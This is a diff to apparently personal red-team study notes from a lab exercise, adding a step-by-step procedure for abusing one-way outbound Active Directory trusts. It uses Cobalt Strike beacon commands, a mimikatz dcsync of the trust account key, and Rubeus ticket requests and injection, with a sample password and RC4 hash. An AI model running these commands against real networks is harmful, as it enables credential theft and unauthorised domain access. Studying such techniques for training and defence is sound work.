@@ -89,7 +89,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /user:Adin
  /service:CIFS/lon-dc-1
 --------------------------------------------------
 
-One Way Inbound Trusts (inbound trust)
+One Way Inbound Trusts (inbound trust) : TrustDirection:1 <-- 1 is inbound
 
 1 - Who are you and your domain: getuid
 2 - beacon> ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname <-- Look at trust direction line
@@ -124,9 +124,21 @@ Above forged a inter-realm TGT that we can use to request service ticket from th
 11 - ls \\par-jmp-1.partner.com\c$ <-- connect for the flag
 ------------------------------------------------------------------
 
+One Way Outbound Trusts <-- TrustDirection:2 <-- 2 is outbound
+----------------------------
 
-
-
-Enumerate trust:  
-Enumerate trust:  
+1 - Who are you and your domain: getuid
+2 - beacon> ldapsearch (objectClass=trustedDomain) <-- Look for TrustDirection Line it will have the #2 which is a outbound trust
+beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com <-- THIS WILL FAIL!!!! We do not have access 
+3- HOWEVER if we have a principal in the trusted domain we can impersonate them
+-- make_token contose\Administrator Passw0rd!
+-- ls \\lon-dc-1.contoso.com\c$ <-- will work
+4- beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID <-- grab the objectguid
+5- beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed} <--objectguid from above (must be elevated to run a dcsync)
+6 - execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap <-- use the RC4 key from above to ask for a trt
+7- Inject the ticket:  execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]
+8- Run klist to check
+9- We should now be able to enumerate and carry out other actions <-- works cause the primarygroupid of the trust account is 513, which grants us domain user access with out being a explicit member.
+-- ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
+-- we can now look for additional attack paths. 
 
